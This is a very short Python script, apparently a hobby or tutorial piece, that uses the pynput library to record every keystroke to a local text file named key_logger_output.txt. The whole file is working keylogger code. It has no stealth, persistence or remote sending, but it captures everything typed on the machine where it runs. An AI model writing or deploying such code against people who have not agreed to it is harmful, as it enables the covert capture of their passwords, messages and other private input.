from pynput import keyboard


def on_press(key):
    with open('key_logger_output.txt', 'a') as y:
        y.write(str(key))



with keyboard.Listener(on_press=on_press,) as listener:
    listener.join()